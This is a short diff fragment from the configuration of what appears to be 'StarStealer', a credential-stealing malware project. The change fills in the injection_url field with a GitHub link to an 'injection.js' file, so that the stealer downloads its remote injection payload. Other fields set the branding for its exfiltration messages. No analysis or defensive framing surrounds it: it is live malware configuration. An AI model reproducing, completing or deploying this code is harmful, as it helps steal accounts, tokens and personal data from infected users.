@@ -14,7 +14,7 @@ const config = {
   embed_name: 'StarStealer Injection', 
   embed_icon: 'https://github.com/yteicos-f/StarStealer/blob/main/logo.ico'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: '', 
+  injection_url: 'https://github.com/yteicos-f/StarStealer/blob/main/injection.js', 
   /**
    
    **/
